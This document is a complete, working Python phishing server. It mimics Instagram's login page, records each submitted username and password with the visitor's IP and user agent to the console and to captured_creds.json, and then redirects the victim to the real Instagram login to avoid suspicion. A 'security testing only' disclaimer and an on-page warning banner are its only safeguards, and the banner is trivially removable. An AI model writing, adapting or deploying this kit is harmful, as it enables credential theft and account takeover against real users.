#!/usr/bin/env python3
"""
Instagram Phishing Simulation
FOR AUTHORIZED SECURITY TESTING ONLY
Illegal to use without explicit permission from account owners.
"""

import http.server
import socketserver
import urllib.parse
import json
import os
from datetime import datetime

# PORT ko environment variable se le rahe hain
PORT = int(os.environ.get('PORT', 8443))

# Instagram-like login page HTML
INSTAGRAM_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { width: 350px; }
        .login-box { background: white; border: 1px solid #dbdbdb; padding: 40px; text-align: center; margin-bottom: 10px; }
        .logo { font-family: 'Billabong', cursive; font-size: 50px; margin-bottom: 30px; color: #262626; }
        input { width: 100%; padding: 9px 8px; margin-bottom: 6px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; font-size: 12px; }
        input:focus { outline: none; border-color: #a8a8a8; }
        button { width: 100%; padding: 8px; background: #0095f6; color: white; border: none; border-radius: 8px; font-weight: 600; margin-top: 12px; cursor: pointer; }
        button:hover { background: #1877f2; }
        .divider { display: flex; align-items: center; margin: 20px 0; color: #8e8e8e; font-size: 13px; font-weight: 600; }
        .divider::before, .divider::after { content: ""; flex: 1; border-bottom: 1px solid #dbdbdb; }
        .divider span { margin: 0 15px; }
        .fb-login { color: #385185; font-size: 14px; font-weight: 600; cursor: pointer; margin: 20px 0; }
        .forgot { color: #00376b; font-size: 12px; margin-top: 20px; cursor: pointer; }
        .signup-box { background: white; border: 1px solid #dbdbdb; padding: 20px; text-align: center; font-size: 14px; }
        .signup-box a { color: #0095f6; text-decoration: none; font-weight: 600; }
        .get-app { text-align: center; margin-top: 20px; }
        .get-app p { margin-bottom: 20px; font-size: 14px; }
        .warning { background: #ff4444; color: white; padding: 10px; text-align: center; font-weight: bold; margin-bottom: 20px; border-radius: 5px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="warning">⚠️ SECURITY TEST ENVIRONMENT ⚠️</div>
        
        <div class="login-box">
            <div class="logo">Instagram</div>
            <form action="/auth" method="POST">
                <input type="text" name="username" placeholder="Phone number, username, or email" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Log In</button>
            </form>
            
            <div class="divider"><span>OR</span></div>
            
            <div class="fb-login">Log in with Facebook</div>
            <div class="forgot">Forgot password?</div>
        </div>
        
        <div class="signup-box">
            Don't have an account? <a href="#">Sign up</a>
        </div>
        
        <div class="get-app">
            <p>Get the app.</p>
        </div>
    </div>
</body>
</html>
'''

class InstagramPhishHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(INSTAGRAM_HTML.encode())
        else:
            self.send_error(404)
    
    def do_POST(self):
        if self.path == '/auth':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode()
            params = urllib.parse.parse_qs(post_data)
            
            credentials = {
                'timestamp': datetime.now().isoformat(),
                'source_ip': self.client_address[0],
                'username': params.get('username', [''])[0],
                'password': params.get('password', [''])[0],
                'user_agent': self.headers.get('User-Agent', 'Unknown'),
                'referer': self.headers.get('Referer', 'Direct')
            }
            
            # Log to console (in production, use secure encrypted storage)
            print(f"\n{'='*50}")
            print(f"[CREDENTIALS CAPTURED]")
            print(f"{'='*50}")
            print(f"Time: {credentials['timestamp']}")
            print(f"IP: {credentials['source_ip']}")
            print(f"Username: {credentials['username']}")
            print(f"Password: {credentials['password']}")
            print(f"{'='*50}\n")
            
            # Save to file
            with open('captured_creds.json', 'a') as f:
                f.write(json.dumps(credentials) + '\n')
            
            # Redirect to real Instagram (credential harvesting technique)
            self.send_response(302)
            self.send_header('Location', 'https://www.instagram.com/accounts/login/')
            self.end_headers()
        else:
            self.send_error(404)
    
    def log_message(self, format, *args):
        # Suppress default logging
        pass

def run_server():
    print(f"Starting server on port {PORT}...")
    print("WARNING: For authorized security testing only!")
    print("Press Ctrl+C to stop\n")
    
    with socketserver.TCPServer(("", PORT), InstagramPhishHandler) as httpd:
        httpd.serve_forever()

if __name__ == "__main__":
    run_server()